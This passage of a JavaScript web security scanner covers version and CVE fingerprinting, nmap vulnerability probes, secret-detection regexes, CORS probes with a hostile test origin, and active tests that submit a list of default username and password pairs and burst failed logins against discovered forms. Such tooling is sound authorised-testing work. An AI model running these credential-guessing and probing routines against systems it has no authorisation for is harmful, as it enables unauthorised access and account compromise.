            title: `${entry.product} ${majorMinor} approaching end-of-life (${eolDate} — ${monthsLeft} months left)`,
            severity: 'low',
            cweId: 'CWE-1104',
            owaspCategory: 'A03:2025-Software Supply Chain Failures',
            description: `${entry.product} ${majorMinor} reaches end-of-life on ${eolDate} (${monthsLeft} months). Plan the upgrade now to avoid running unpatched software.`,
            remediation: `Schedule an upgrade of ${entry.product} before ${eolDate}.`,
            module: 'version-lifecycle',
            evidence: {
              product: entry.product,
              version: majorMinor,
              eolDate,
              eolDateDerived: derived,
              monthsLeft,
              cveLookupOwner: 'version-audit',
            },
          }, { verify })
        }
      }
    }
  }

  /**
   * VERSION AUDIT — architecture fingerprinting + CVE/CWE correlation.
   *
   * Collects every version string visible on the target from three sources:
   *   1. Live HTTP response (headers + body) — the authoritative source
   *   2. Stored findings from whatweb / nmap / httpx / nikto
   *   3. Error-page fingerprints and cookie names (product without version)
   *
   * Each detected product+version is then correlated against NIST NVD and
   * mapped to the OWASP Top 10 (2025) category that fits the component type.
   */
  async _auditVersions(scanId, target, { verify } = {}) {
    const baseUrl = /^https?:\/\//i.test(target) ? target : `https://${target}`

    // ── 1. Live fetch: headers + body ──
    let liveText = ''
    const candidates = [
      baseUrl,
      ...(this._urlPool?.get(scanId) ? [...this._urlPool.get(scanId)] : []),
      ...['/robots.txt', '/.well-known/security.txt', '/manifest.json'].map(p => joinUrl(baseUrl, p)),
    ].filter((url, i, urls) => /^https?:\/\//i.test(url) && urls.indexOf(url) === i).slice(0, 12)
    for (const url of candidates) {
      try {
        const ctrl = new AbortController()
        const t = setTimeout(() => ctrl.abort(), 10000)
        const res = await fetch(url, {
          redirect: 'follow',
          signal: ctrl.signal,
          headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SentinelAI/2.0; +security-audit)' },
        })
        clearTimeout(t)
        const headerText = [...res.headers.entries()].map(([k, v]) => `${k}: ${v}`).join('\n')
        const body = await res.text().catch(() => '')
        liveText += `\nURL: ${url}\n${headerText}\n${body.slice(0, 50000)}`
        this.log(scanId, 'info', `🔬 Version audit: fetched ${url} (${res.status}, ${body.length} bytes body)`)
      } catch (e) {
        this.log(scanId, 'warn', `🔬 Version audit: fetch failed for ${url} (${e.message})`)
      }
    }

    // ── 2. Stored findings from earlier tool batches ──
    const rows = db.all(`SELECT title, description, evidence FROM findings WHERE scan_id = ?`, scanId)
    const storedText = rows.map(r => `${r.title} ${r.description} ${r.evidence || ''}`).join('\n').slice(0, 300000)

    const combined = `${liveText}\n${storedText}`

    // ── 3. Extract versions ──
    const detected = extractVersions(combined, liveText ? 'live-http-response' : 'stored-findings')
    const unversioned = extractProductsWithoutVersion(combined, liveText ? 'live-http-response' : 'stored-findings')

    if (!detected.length && !unversioned.length) {
      this.log(scanId, 'info', '🔬 Version audit: no software versions could be fingerprinted (WAF/CDN masking likely)')
      await this.ingestFinding(scanId, {
        title: 'Technology and architecture fingerprint inconclusive',
        severity: 'info',
        owaspCategory: 'A03:2025-Software Supply Chain Failures',
        description: `No reliable product/version signature was exposed across ${candidates.length} HTTP endpoint${candidates.length === 1 ? '' : 's'} and stored scanner evidence. This is not proof that the stack is secure; a WAF, CDN, custom error pages, or banner suppression may be hiding the architecture.`,
        remediation: 'Confirm the operating system, reverse proxy, application server, framework, runtime, database, dependency lockfiles, and patch levels from an authenticated asset inventory or host-side scan. Re-run with authorized service/version detection where permitted.',
        module: 'version-audit',
        evidence: { scannedUrls: candidates, detection: 'no-versioned-signature', validationTier: 'needs-validation' },
      })
      return
    }

    this.log(scanId, 'info', `🔬 Version audit: ${detected.length} versioned component(s), ${unversioned.length} unversioned product(s) detected`)
    for (const d of detected) {
      this.log(scanId, 'info', `🔬 Detected: ${d.product} ${d.version} (${d.kind}) via ${d.source}`)
    }

    // ── 4. Correlate each version against NVD (sequential — NVD rate-limits) ──
    const seenProducts = new Set()
    for (const d of detected) {
      await this.waitIfPaused(scanId)
      const key = `${d.product}@${d.version}`.toLowerCase()
      if (seenProducts.has(key)) continue
      seenProducts.add(key)

      const correlation = await correlateVersion({
        product: d.product,
        version: d.version,
        log: (msg) => this.log(scanId, 'info', msg),
      })

      if (correlation.error) {
        // A failed lookup is NOT a clean component. Silently continuing made the
        // report omit the component entirely, which a reader then interpreted as
        // "nothing found" instead of "the check could not run".
        this.log(scanId, 'warn', `🔬 CVE lookup failed for ${d.product} ${d.version}: ${correlation.error}`)
        const clean = buildVersionFinding(d, { ...correlation, results: [] })
        await this.ingestFinding(scanId, {
          ...clean,
          title: `${d.product} ${d.version} fingerprinted — NVD lookup failed`,
          severity: 'low',
          description:
            `${d.product} ${d.version} (${d.kind}) was read from ${d.source} at ${d.matched}, but the NIST NVD ` +
            `lookup could not complete (${correlation.error}). No conclusion about this version's vulnerability ` +
            `status can be drawn from this scan — the absence of advisories here is a tool failure, not evidence of patching.`,
          remediation: `Re-run the CVE correlation for ${d.product} ${d.version} against NVD (rate limits and network egress are the usual causes), or confirm the patch level from the vendor's advisory feed directly.`,
          evidence: { ...clean.evidence, totalCves: null, knownCves: [], nvdMatch: 'error', nvdStatus: 'error', nvdError: String(correlation.error).slice(0, 400) },
        }, { verify: false })
        continue
      }
      if (!correlation.total) {
        // A fingerprinted version with no NVD match is still an inventory fact
        // and still proof that the version banner is exposed. Skipping it left
        // the report claiming the stack was "inconclusive" on scans where the
        // server had happily announced its exact build.
        this.log(scanId, 'info', `🔬 ${d.product} ${d.version}: no matching CVEs on NVD (recording fingerprint only)`)
        const clean = buildVersionFinding(d, correlation)
        await this.ingestFinding(scanId, {
          ...clean,
          title: `${d.product} ${d.version} fingerprinted — no NVD advisory matched`,
          severity: 'low',
          description:
            `${d.product} ${d.version} (${d.kind}) was read from ${d.source} at ${d.matched}. ` +
            `NIST NVD returned no advisory for this product/version pair. ` +
            `That is not a clean bill of health: NVD matching is keyword-based, vendor advisories are published outside it, ` +
            `and a suppressed or backported build number can hide a vulnerable body. ` +
            `Confirm the installed version against the vendor's own advisory feed before treating it as patched.`,
          evidence: { ...clean.evidence, totalCves: 0, knownCves: [], nvdMatch: 'empty', nvdStatus: 'empty' },
        }, { verify: false })
        continue
      }

      const finding = buildVersionFinding(d, correlation)
      await this.ingestFinding(scanId, finding, { verify })
      this.log(scanId, 'info', `📌 [${finding.severity}] ${finding.title}`)
    }

    // ── 5. Unversioned products (lower severity, still reported) ──
    // WAF/CDN products are collapsed into ONE infrastructure-inventory card:
    // whatweb, wafw00f and header fingerprints each recognise the same edge,
    // so per-product emission produced several duplicate "Cloudflare" rows.
    const edgeInventory = buildEdgeInventoryFinding(unversioned)
    if (edgeInventory) {
      await this.ingestFinding(scanId, edgeInventory, { verify })
      this.log(scanId, 'info', `📌 [${edgeInventory.severity}] ${edgeInventory.title}`)
    }
    for (const u of unversioned) {
      if (isEdgeProduct(u)) continue
      const alreadyVersioned = detected.some(d => d.product.toLowerCase() === u.product.toLowerCase())
      if (alreadyVersioned) continue
      const finding = buildUnversionedFinding(u)
      await this.ingestFinding(scanId, finding, { verify })
      this.log(scanId, 'info', `📌 [${finding.severity}] ${finding.title}`)
    }
  }

  /**
   * OFFENSIVE: service-level vulnerability probing on open ports.
   * Uses nmap NSE scripts for concrete CVEs (heartbleed, ms17-010, ftp-anon,
   * smb-vuln, ssl-poodle) against the target's open services.
   */  async _probeServiceVulns(scanId, target, { verify } = {}) {
    const host = (() => {
      try { return new URL(/^https?:\/\//i.test(target) ? target : `https://${target}`).hostname }
      catch { return projectHost(target).host }
    })()
    this.log(scanId, 'info', `⚔️ Offensive service-vuln probing on ${host} (heartbleed / ms17-010 / ftp-anon / ssl-poodle)...`)
    const scripts = [
      { name: 'ssl-heartbleed', args: ['--script', 'ssl-heartbleed', '-p', '443'], cve: 'CVE-2014-0160', sev: 'critical' },
      { name: 'ssl-poodle', args: ['--script', 'ssl-poodle', '-p', '443'], cve: 'CVE-2014-3566', sev: 'medium' },
      { name: 'ftp-anon', args: ['--script', 'ftp-anon', '-p', '21'], cve: null, sev: 'high' },
      { name: 'smb-vuln-ms17-010', args: ['--script', 'smb-vuln-ms17-010', '-p', '445'], cve: 'CVE-2017-0144', sev: 'critical' },
      { name: 'http-shellshock', args: ['--script', 'http-shellshock', '-p', '80,443,8080'], cve: 'CVE-2014-6271', sev: 'critical' },
    ]
    for (const s of scripts) {
      await this.waitIfPaused(scanId)
      try {
        this.log(scanId, 'info', `⚔️ $ nmap ${host} ${s.args.join(' ')}`)
        const r = await runNativeTool('nmap-script', `${host} ${s.args.join(' ')}`, { owner: scanId })
        const out = `${r.stdout || ''}\n${r.stderr || ''}`
        if (/VULNERABLE/i.test(out)) {
          await this.ingestFinding(scanId, {
            title: `${s.name}: target VULNERABLE${s.cve ? ` (${s.cve})` : ''}`,
            severity: s.sev,
            cveId: s.cve,
            cweId: 'CWE-119',
            owaspCategory: 'A03:2025-Software Supply Chain Failures',
            description: `nmap NSE script "${s.name}" reports the target is VULNERABLE. This is a scanner-confirmed, remotely exploitable condition.`,
            remediation: 'Patch the affected service immediately; if patching is impossible, isolate the service behind a firewall.',
            module: 'offensive:service-probe',
            evidence: { script: s.name, output: out.split('\n').filter(l => /vulnerab|cve|state/i.test(l)).join('\n').slice(0, 800) },
          }, { verify })
          this.log(scanId, 'info', `⚔️ ${s.name}: VULNERABLE`)
        }
      } catch { /* script unavailable — skip */ }
    }
  }

  /**
   * OFFENSIVE: discover login surfaces (admin panels, auth endpoints) from
   * crawled/fuzzed URLs and flag them as brute-force/hardening targets.
   */
  async _discoverLoginSurfaces(scanId, target, { verify } = {}) {
    const urls = this._urlPool?.get(scanId) ? [...this._urlPool.get(scanId)] : []
    const loginRe = /login|signin|sign-in|auth|admin|wp-login|phpmyadmin|cpanel|webmail|portal|dashboard/i
    const hits = [...new Set(urls.filter(u => loginRe.test(u)))].slice(0, 10)
    if (!hits.length) return
    this.log(scanId, 'info', `⚔️ Login surfaces discovered: ${hits.length}`)
    for (const u of hits) {
      await this.ingestFinding(scanId, {
        title: `Authentication surface exposed — ${u.slice(0, 110)}`,
        severity: 'low',
        cweId: 'CWE-284',
        owaspCategory: 'A07:2025-Authentication Failures',
        description: `A login/authentication endpoint was discovered at ${u}. It is a candidate for credential attacks (password spraying, default credentials, brute-force) and should enforce MFA, rate-limiting, and lockout.`,
        remediation: 'Enforce MFA, CAPTCHA after N failures, IP-based rate limiting, and strong password policy on all authentication surfaces.',
        module: 'offensive:login-surface',
        evidence: { url: u },
      }, { verify })
    }
  }

  /**
   * OFFENSIVE: actually interact with discovered login forms — try common
   * default credential pairs via HTTP POST. This is real interaction with
   * the target (fills + submits the form), not just URL pattern matching.
   * Only fires on forms we've harvested with detected password fields.
   */
  async _tryDefaultCreds(scanId, target, { verify } = {}) {
    const base = /^https?:\/\//i.test(target) ? target : `https://${target}`
    const forms = this._loginForms?.get(scanId) || []
    if (!forms.length) {
      this.log(scanId, 'info', '🔑 No login forms harvested — skipping default-credential test')
      return
    }
    this.log(scanId, 'info', `🔑 Testing ${forms.length} login form(s) with default credentials...`)

    // Common default credential pairs (top-10, keeps requests polite)
    const CREDS = [
      ['admin', 'admin'], ['admin', 'password'], ['admin', '123456'],
      ['root', 'root'], ['root', 'toor'], ['admin', 'admin123'],
      ['test', 'test'], ['guest', 'guest'], ['user', 'user'],
      ['administrator', 'password'],
    ]

    for (const form of forms.slice(0, 3)) {
      await this.waitIfPaused(scanId)
      const { url, userField, passField, extra } = form
      this.log(scanId, 'info', `🔑 Probing ${url.slice(0, 90)} (user="${userField}", pass="${passField}")`)
      let lastStatus = null
      let lastBody = ''
      let lastUrl = ''
      for (const [user, pass] of CREDS) {
        try {
          const body = new URLSearchParams({ [userField]: user, [passField]: pass, ...extra })
          const res = await fetch(url, {
            method: 'POST',
            body,
            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) SentinelAI' },
            redirect: 'follow', // follow redirects so we see the FINAL page, not the 303 stub
            signal: AbortSignal.timeout(10000),
          })
          lastStatus = res.status
          lastBody = (await res.text()).slice(0, 5000)
          lastUrl = res.url || url
          // ── Success detection (strict — avoids Moodle-style false positives) ──
          // Moodle (and many apps) 303-redirect BACK to /login/index.php on FAILURE.
          // A real login success lands on a non-login page whose body no longer
          // contains the login form NOR any auth-failure error string.
          const landedOnLogin = /login|signin|auth|logon/i.test(lastUrl)
          const hasLoginForm = /<form[^>]*>/i.test(lastBody) && /type=["']?password/i.test(lastBody)
          const hasAuthError = /(invalid|wrong|incorrect|failed|error|denied|try again|bad (user|login|password))/i.test(lastBody)
          const success = !landedOnLogin && !hasLoginForm && !hasAuthError
          if (success) {
            await this.ingestFinding(scanId, {
              title: `Default credentials accepted — ${user}:${pass} @ ${url.slice(0, 80)}`,
              severity: 'critical',
              cweId: 'CWE-798',
              owaspCategory: 'A07:2025-Authentication Failures',
              description: `The login form at ${url} accepted the default credential pair ${user}:${pass}. The scanner filled and submitted the form via HTTP POST, followed the redirect chain, and landed on ${lastUrl.slice(0, 80)} (HTTP ${res.status}) — a non-login page with no authentication-error message, confirming successful authentication. This grants immediate unauthorized access.`,
              remediation: 'Remove all default credentials. Force password change on first login. Enforce MFA.',
              module: 'offensive:default-creds',
              evidence: { url, user, pass: '***', status: res.status, landedOn: lastUrl.slice(0, 120) },
            }, { verify })
            this.log(scanId, 'info', `🔑💥 DEFAULT CREDS ACCEPTED: ${user}:*** @ ${url.slice(0, 80)}`)
            break
          }
        } catch { /* network error — try next cred */ }
        // Polite delay between attempts to avoid tripping rate-limiters hard
        await new Promise(r => setTimeout(r, 400))
      }
      if (lastStatus) this.log(scanId, 'info', `🔑 ${url.slice(0, 70)} — ${CREDS.length} pairs tried, last response ${lastStatus}`)
    }
  }

  /**
   * OFFENSIVE: login rate-limit / brute-force protection testing.
   * Sends a burst of rapid failed authentication attempts to a harvested
   * login form and measures whether the target throttles (429), locks out,
   * inserts a CAPTCHA, or slows down. Absence of ANY rate limiting means
   * the login form is brute-forceable at full network speed.
   *
   * ⚠️  WARNING: This test sends 10 rapid failed login attempts with zero delay.
   *    It may trigger WAF rules, IDS alerts, or IP blocking on the target.
   *    This is expected behavior and should be documented in the engagement scope.
   */
  async _testLoginRateLimit(scanId, target, { verify } = {}) {
    const base = /^https?:\/\//i.test(target) ? target : `https://${target}`
    const forms = this._loginForms?.get(scanId) || []
    if (!forms.length) {
      this.log(scanId, 'info', '🚦 No login forms harvested — skipping rate-limit test')
      return
    }
    const form = forms[0] // one form is enough — rate limits are usually global
    const { url, userField, passField, extra } = form
    this.log(scanId, 'info', `🚦 Rate-limit test: 10 rapid failed logins @ ${url.slice(0, 80)}`)
    const BURST = 10
    const statuses = []
    const times = []
    const bodies = []
    let captchaAppeared = false
    let lockoutAppeared = false
    for (let i = 0; i < BURST; i++) {
      await this.waitIfPaused(scanId)
      try {
        const body = new URLSearchParams({ [userField]: `ratelimitprobe${i}`, [passField]: `WrongPass!${i}`, ...extra })
        const t0 = Date.now()
        const res = await fetch(url, {
          method: 'POST',
          body,
          headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) SentinelAI' },
          redirect: 'follow',
          signal: AbortSignal.timeout(10000),
        })
        times.push(Date.now() - t0)
        statuses.push(res.status)
        const text = (await res.text()).slice(0, 5000)
        bodies.push(text)
        if (/captcha|recaptcha|hcaptcha|turnstile|are you human|verify you are human/i.test(text)) captchaAppeared = true
        if (/locked|too many (attempts|tries)|temporarily blocked|account blocked|try again later|wait \d+ (minute|second)/i.test(text)) lockoutAppeared = true
      } catch { statuses.push(0); times.push(-1) }
      // NO delay between attempts — the whole point is to test burst handling
    }
    const throttled = statuses.some(s => s === 429 || s === 503)
    const statusChanged = new Set(statuses).size > 1
    // Reaching any conclusion requires at least a few real HTTP responses. On a
    // dead host, refused connection, or DNS failure every attempt records
    // status 0 — without this gate that is misreported as "no rate limiting —
    // brute-force possible", which is a false positive against an unreachable
    // target.
    const reached = statuses.filter(s => s > 0).length
    if (reached < 3) {
      this.log(scanId, 'warn', `🚦 Rate-limit test inconclusive for ${url.slice(0, 80)} — only ${reached}/${BURST} attempts got a response (server unreachable or blocking)`);
      return
    }
    // Response-time drift: if later responses are dramatically slower, a
    // tarpit/delay-based limiter is active
    const firstHalf = times.slice(0, 5).filter(t => t > 0)
    const secondHalf = times.slice(5).filter(t => t > 0)
    const avg = a => a.length ? a.reduce((x, y) => x + y, 0) / a.length : 0
    const slowdown = firstHalf.length && secondHalf.length ? avg(secondHalf) > avg(firstHalf) * 3 : false
    const protected_ = throttled || captchaAppeared || lockoutAppeared || slowdown
    if (protected_) {
      const mechanism = [
        throttled && 'HTTP 429/503 throttling',
        captchaAppeared && 'CAPTCHA insertion',
        lockoutAppeared && 'account lockout message',
        slowdown && `response-time slowdown (${Math.round(avg(firstHalf))}ms → ${Math.round(avg(secondHalf))}ms)`,
      ].filter(Boolean).join(', ')
      await this.ingestFinding(scanId, {
        title: `Login rate limiting ACTIVE on ${new URL(url).pathname} (${mechanism})`,
        severity: 'info',
        cweId: 'CWE-307',
        owaspCategory: 'A07:2025-Authentication Failures',
        description: `A burst of ${BURST} rapid failed login attempts was answered with ${mechanism}. Brute-force protection is functioning correctly — this is a positive control confirmation.`,
        remediation: 'No action needed — rate limiting is active. Consider also alerting on repeated lockout events.',
        module: 'offensive:rate-limit',
        evidence: { url, statuses, mechanism },
      }, { verify })
      this.log(scanId, 'info', `🚦 Rate limiting CONFIRMED active (${mechanism})`)
    } else {
      await this.ingestFinding(scanId, {
        title: `No rate limiting on login form ${new URL(url).pathname} — brute-force possible`,
        severity: 'medium',
        cweId: 'CWE-307',
        owaspCategory: 'A07:2025-Authentication Failures',
        description: `${BURST} rapid failed login attempts were submitted to ${url} with zero delay between requests. Every attempt received the same status (${statuses[0]}), no CAPTCHA appeared, no lockout message was shown, and response times stayed flat (avg ${Math.round(avg(times.filter(t => t > 0)))}ms). The login endpoint can be brute-forced at full network speed — combined with credential-stuffing wordlists this makes account compromise a matter of time.`,
        remediation: 'Implement rate limiting (e.g. fail2ban, WAF rule, or application-level throttling) on the login endpoint: limit to ~5 attempts per minute per IP and per account, with exponential backoff and account lockout after repeated failures.',
        module: 'offensive:rate-limit',
        evidence: { url, statuses, times, statusChanged },
      }, { verify })
      this.log(scanId, 'warn', `🚦 NO rate limiting detected on ${url.slice(0, 80)} — brute-force possible`)
    }
  }

  /**
   * OFFENSIVE: cross-reference all collected findings against the offsec
   * payload knowledge base (knowledge/payloads) so every finding gets an
   * attached exploitation payload reference in the report.
   */
  async _matchOffsecPayloads(scanId) {
    try {
      const rows = db.all(`SELECT * FROM findings WHERE scan_id = ?`, scanId)
      let matched = 0
      for (const f of rows) {
        try {
          const enriched = payloadsRag.crossReference({ title: f.title, severity: f.severity, description: f.description })
          // Never clobber a PoC that a targeted stage already proved (e.g. the
        // session-hijack PoC attached by chainInjectionTests). The RAG template
        // is a generic suggestion, not evidence — it only fills a blank slot.
        if (!f.poc && enriched?.poc && Object.keys(enriched.poc).length) {
            db.run(`UPDATE findings SET poc = ? WHERE id = ?`, JSON.stringify(enriched.poc), f.id)
            matched++
          }
        } catch { /* per-finding */ }
      }
      if (matched) this.log(scanId, 'info', `⚔️ Attached offsec payload references to ${matched} findings (knowledge/payloads)`)
    } catch { /* non-fatal */ }
  }

  /**
   * Scan response bodies of discovered URLs for leaked secrets, tokens,
   * internal IPs, debug info, stack traces, and HTML comments.
   */
  async _scanResponseBodies(scanId, target, { verify } = {}) {
    const urls = this._urlPool?.get(scanId) ? [...this._urlPool.get(scanId)].slice(0, 20) : []
    const base = /^https?:\/\//i.test(target) ? target : `https://${target}`
    if (!urls.includes(base)) urls.unshift(base)

    this.log(scanId, 'info', `🔍 Scanning response bodies for secrets/debug info on ${urls.length} URLs...`)
    for (const url of urls) {
      await this.waitIfPaused(scanId)
      try {
        const res = await fetch(url, { redirect: 'follow', signal: AbortSignal.timeout(8000) })
        const body = (await res.text()).slice(0, 200000)
        const headers = Object.fromEntries(res.headers.entries())
        const bodyLower = body.toLowerCase()

        // API keys / tokens in responses
        const keyPatterns = [
          { re: /(?:api[_-]?key|apikey|access[_-]?token)\s*[:=]\s*['"][A-Za-z0-9_\-+/=]{16,}['"]/gi, label: 'API key in response' },
          { re: /eyJ[a-zA-Z0-9_-]{8,}\.eyJ[a-zA-Z0-9_-]{8,}\.[a-zA-Z0-9_\-]{8,}/g, label: 'JWT token in response' },
          { re: /(?:mongodb|postgres|mysql|redis|amqp):\/\/[^:]+:[^@"'\s]+@/gi, label: 'Database connection string in response' },
          { re: /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/g, label: 'Private key in response' },
          { re: /ghp_[a-zA-Z0-9]{30,}/g, label: 'GitHub PAT in response' },
          { re: /sk-[a-zA-Z0-9]{40,}/g, label: 'OpenAI API key in response' },
        ]
        for (const { re, label } of keyPatterns) {
          const matches = body.match(re)
          if (matches?.length) {
            await this.ingestFinding(scanId, {
              title: `${label} (${matches.length} found)`,
              severity: 'critical',
              cweId: 'CWE-200',
              owaspCategory: 'A01:2025-Broken Access Control',
              description: `${label} found in response body at ${url}. This is a critical information disclosure that may allow full compromise.`,
              remediation: 'Never embed secrets in client-side responses. Use server-side env vars and rotate all exposed keys immediately.',
              module: 'response-body-scan',
              evidence: { url, count: matches.length, redacted: matches.slice(0, 3).map(m => `${m.slice(0, 12)}...`) },
            }, { verify })
            this.log(scanId, 'info', `🔍 ${label} — ${matches.length} matches at ${url}`)
          }
        }

        // Internal IP disclosure
        const ipMatches = body.match(/(?:10\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}/g)
        if (ipMatches?.length) {
          await this.ingestFinding(scanId, {
            title: `Internal IP disclosure (${new Set(ipMatches).size} unique)`,
            severity: 'medium',
            cweId: 'CWE-200',
            owaspCategory: 'A02:2025-Security Misconfiguration',
            description: `Internal IP addresses found in response body at ${url}: ${[...new Set(ipMatches)].slice(0, 5).join(', ')}. Helps attackers map internal network.`,
            remediation: 'Remove internal IPs from public-facing responses.',
            module: 'response-body-scan',
            evidence: { url, ips: [...new Set(ipMatches)].slice(0, 10) },
          }, { verify })
        }

        // Stack traces / debug info
        // STRICT: require actual stack-frame STRUCTURE, not just the phrase
        // "stack trace" — Moodle/JS apps legitimately ship the translated
        // error-label string "Stack trace" in their config (a false MEDIUM).
        // A real trace has frames: "at func (file:line:col)", Python
        // "Traceback (most recent call last)", or PHP "Fatal error: ... in /path on line N".
        const stackEvidence =
          body.match(/at\s+[\w$.]+\s*\([^)]*:\d+:\d+\)/) ||                    // JS/Java frames
          body.match(/Traceback \(most recent call last\)/) ||                   // Python
          body.match(/Fatal error:[^\n]*\bin\b[^\n]*\bon line \d+/i) ||          // PHP
          body.match(/#[\d]+\s+[\w$\\/().]+\(\): called at/i) ||                 // PHP 7+ frames
          body.match(/Exception(?:\s+\w+)?[^\n]{0,120}\n\s+at\s+[\w$.]+:\d+/)    // generic frame chain
        if (stackEvidence) {
          await this.ingestFinding(scanId, {
            title: `Debug/error information exposed in response`,
            severity: 'medium',
            cweId: 'CWE-209',
            owaspCategory: 'A02:2025-Security Misconfiguration',
            description: `Stack trace or debug info found in response at ${url}. Discloses internal paths, framework versions, and code structure.`,
            remediation: 'Disable debug mode and custom error pages in production.',
            module: 'response-body-scan',
            evidence: { url, snippet: String(stackEvidence[0]).slice(0, 300) },
          }, { verify })
        }

        // HTML comments with sensitive content
        const commentMatches = body.match(/<!--[\s\S]*?-->/g)
        if (commentMatches?.length) {
          const sensitive = commentMatches.filter(c => /(?:TODO|FIXME|HACK|password|secret|key|token|admin|api|debug|test|staging|dev|user|email)/i.test(c))
          if (sensitive.length) {
            await this.ingestFinding(scanId, {
              title: `Sensitive information in HTML comments (${sensitive.length} comments)`,
              severity: 'low',
              cweId: 'CWE-615',
              owaspCategory: 'A02:2025-Security Misconfiguration',
              description: `HTML comments at ${url} contain potentially sensitive info: ${sensitive.slice(0, 3).map(c => c.slice(0, 120)).join(' | ')}`,
              remediation: 'Remove sensitive comments from production HTML.',
              module: 'response-body-scan',
              evidence: { url, count: sensitive.length },
            }, { verify })
          }
        }
      } catch { /* skip unreachable */ }
    }
  }

  /**
   * Audit cookie security flags, CORS/ACAO headers, and harvest HTML forms
   * for injection surface enumeration.
   */
  async _auditCookiesCors(scanId, target, { verify } = {}) {
    const base = String(target || '').replace(/\/+$/, '')
    this.log(scanId, 'info', `🍪 Auditing cookie security, CORS, and harvesting forms...`)

    try {
      const { response: res, url: resolvedBase } = await fetchWithHttpFallback(base, { redirect: 'follow', signal: AbortSignal.timeout(10000) })
      const requestBase = resolvedBase.replace(/\/+$/, '')
      const headers = Object.fromEntries(res.headers.entries())
      const body = (await res.text()).slice(0, 500000)

      // Cookie security
      const setCookies = typeof res.headers.getSetCookie === 'function'
        ? res.headers.getSetCookie()
        : splitSetCookieHeader(res.headers.get('set-cookie'))
      if (setCookies.length) {
        const missingSecure = setCookies.some(cookie => !/;\s*secure(?:;|$)/i.test(cookie))
        const missingHttpOnly = setCookies.some(cookie => !/;\s*httponly(?:;|$)/i.test(cookie))
        const missingSameSite = setCookies.some(cookie => !/;\s*samesite=/i.test(cookie))
        if (missingSecure || missingHttpOnly || missingSameSite) {
          const issues = []
          if (missingSecure) issues.push('Secure')
          if (missingHttpOnly) issues.push('HttpOnly')
          if (missingSameSite) issues.push('SameSite')
          await this.ingestFinding(scanId, {
            title: `Insecure cookie flags — missing ${issues.join(', ')}`,
            severity: 'medium',
            cweId: 'CWE-614',
            owaspCategory: 'A07:2025-Authentication Failures',
            description: `Cookies set by ${base} are missing ${issues.join(', ')}. Without Secure, cookies transmit over HTTP. Without HttpOnly, JS can steal them. Without SameSite, CSRF is easier.`,
            remediation: 'Set Secure, HttpOnly, and SameSite=Lax/Strict on all session cookies.',
            module: 'cookie-audit',
            evidence: { url: resolvedBase, cookies: setCookies.slice(0, 10), missing: issues },
          }, { verify })
        }
      }

      // CORS / Access-Control-Allow-Origin — FULL MATRIX
      // Passive check first (headers on a normal request), then ACTIVE
      // reflection probes with hostile origins. A reflected ACAO + ACAC:true
      // = full session hijack chain; reflected ACAO without ACAC = data read
      // from unauthenticated endpoints only.
      const acao = headers['access-control-allow-origin'] || ''
      const acac = headers['access-control-allow-credentials'] || ''
      if (acao === '*') {
        await this.ingestFinding(scanId, {
          title: `CORS: Access-Control-Allow-Origin: *`,
          severity: 'low',
          cweId: 'CWE-942',
          owaspCategory: 'A02:2025-Security Misconfiguration',
          description: `CORS allows any origin (*) at ${base}. While credentials won't be sent, this allows any site to read public API responses.`,
          remediation: 'Restrict ACAO to specific trusted origins. Never use * with credentials.',
          module: 'cors-audit',
          evidence: { url: requestBase, acao, acac },
        }, { verify })
      } else if (acao && acao !== 'null' && acac === 'true') {
        await this.ingestFinding(scanId, {
          title: `CORS with credentials enabled — ${acao}`,
          severity: 'medium',
          cweId: 'CWE-942',
          owaspCategory: 'A02:2025-Security Misconfiguration',
          description: `CORS allows origin "${acao}" with credentials at ${base}. If this origin is not fully trusted, it enables cross-origin authenticated requests.`,
          remediation: 'Verify the allowed origin is fully trusted. Prefer explicit origin validation over wildcards.',
          module: 'cors-audit',
          evidence: { url: requestBase, acao, acac },
        }, { verify })
      }
      // ── ACTIVE CORS MATRIX: probe with hostile origins ──
      try {
        const EVIL_ORIGINS = [
          'https://evil-attacker-domain.com',
          `https://${new URL(requestBase).hostname}.evil-attacker-domain.com`, // subdomain spoof
          'null',
        ]
        for (const origin of EVIL_ORIGINS) {
          await this.waitIfPaused(scanId)
          const probe = await fetch(requestBase, {
            method: 'GET',
            headers: { Origin: origin, 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) SentinelAI' },
            redirect: 'follow',
            signal: AbortSignal.timeout(10000),
          })
          const pAcao = probe.headers.get('access-control-allow-origin') || ''
          const pAcac = (probe.headers.get('access-control-allow-credentials') || '').toLowerCase()
          const reflected = pAcao && pAcao !== '*' && pAcao.toLowerCase() === origin.toLowerCase()
          if (reflected && pAcac === 'true') {
            await this.ingestFinding(scanId, {
              title: `CORS origin reflection WITH credentials — session hijack possible`,
              severity: 'high',
              cweId: 'CWE-942',
              owaspCategory: 'A02:2025-Security Misconfiguration',
              description: `The server REFLECTS arbitrary origins in Access-Control-Allow-Origin and sets Access-Control-Allow-Credentials: true. Proven with hostile origin "${origin}": the server responded ACAO: ${pAcao}, ACAC: true. Any malicious website can make authenticated cross-origin requests in a victim's browser and READ the responses — full session hijack of any authenticated endpoint.`,
              remediation: 'Never reflect the Origin header. Maintain an explicit allowlist of trusted origins; reject all others without CORS headers.',
              module: 'cors-audit',
              evidence: { url: requestBase, probedOrigin: origin, reflectedAcao: pAcao, acac: pAcac },
            }, { verify })
            this.log(scanId, 'warn', `🌐 CORS reflection + credentials @ ${base} (origin ${origin})`)
            break // one proof is enough
          } else if (reflected) {
            await this.ingestFinding(scanId, {
              title: `CORS origin reflection (no credentials) — ${new URL(requestBase).hostname}`,
              severity: 'low',
              cweId: 'CWE-942',
              owaspCategory: 'A02:2025-Security Misconfiguration',
              description: `The server reflects arbitrary origins in Access-Control-Allow-Origin (probed with "${origin}" → ACAO: ${pAcao}) but does NOT set Access-Control-Allow-Credentials. Cross-origin reads are possible for unauthenticated endpoints only — session hijack is NOT possible, but public API data can be scraped cross-origin.`,
              remediation: 'Use an explicit origin allowlist instead of reflection.',
              module: 'cors-audit',
              evidence: { url: requestBase, probedOrigin: origin, reflectedAcao: pAcao, acac: pAcac },
            }, { verify })
            break
          }
        }
      } catch { /* CORS probe non-fatal */ }

